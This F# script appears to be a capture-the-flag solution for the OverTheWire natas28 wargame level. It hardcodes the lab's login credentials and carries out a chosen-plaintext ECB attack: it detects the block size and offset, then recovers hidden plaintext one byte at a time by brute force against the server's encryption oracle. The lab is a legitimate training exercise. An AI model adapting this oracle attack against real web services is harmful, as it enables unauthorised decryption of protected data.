open System
open System.Net

let url = "http://natas28.natas.labs.overthewire.org/"
let credentials = "natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let hex (bytes: seq<byte>) =
    bytes
    |> Seq.map (fun b -> Convert.ToString(b, 16).PadLeft(2, '0'))
    |> String.concat ""

let b64tohex s =
    Convert.FromBase64String(s) |> hex

let hexFor (query: string) =
    let url = sprintf "%s?query=%s" url (WebUtility.UrlEncode(query))
    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Method <- "HEAD"
    http.AllowAutoRedirect <- false

    let response =
        try
            http.GetResponse ()
        with | :? WebException as webEx ->
            webEx.Response
    let newUrl = response.Headers.["Location"]
    let query = WebUtility.UrlDecode(newUrl.Substring(newUrl.IndexOf("query=") + 6))
    b64tohex query

let blockSize = 
    let baseSize = hexFor ""
    let atSize8 = hexFor "AAAAAAAA"
    if atSize8.Length > baseSize.Length then 8
    else
        let atSize16 = hexFor "AAAAAAAAAAAAAAAA"
        if atSize16.Length > baseSize.Length then 16
        else failwith "something is wrong"

printfn "blocksize: %i" blockSize

let chunked (hex: string) =
    Seq.chunkBySize (blockSize * 2) hex
    |> Seq.map (fun ca -> String(ca))
    |> Seq.toArray

let offset = 
    let size = 
        [0..blockSize * 2 - 1] 
        |> List.pick (fun n ->
            let query = String.replicate n "x" + String.replicate (blockSize * 2) "y"
            let chunks = hexFor query |> chunked
            if Set.count (Set.ofArray chunks) <> chunks.Length then Some n
            else None)
    String.replicate size "x"
    
printfn "offset: %i" offset.Length

let rec exploiter (soFar: string) =
    let staticSize = (blockSize - soFar.Length) - 1
    let query = offset + String.replicate staticSize "y"
    let target = hexFor query
    let nextChars =
        [0..255]
        |> List.map (char >> string)
        |> List.filter (fun c -> 
            let guess = query + soFar + c
            printfn "testing %s" guess
            let result = hexFor guess
            target = result)
    printfn "%A" nextChars
    let nextSoFar = soFar + nextChars.[nextChars.Length - 1]
    printfn "%s" nextSoFar
    if nextSoFar.Length = blockSize * 2 then nextSoFar
    else exploiter nextSoFar

exploiter ""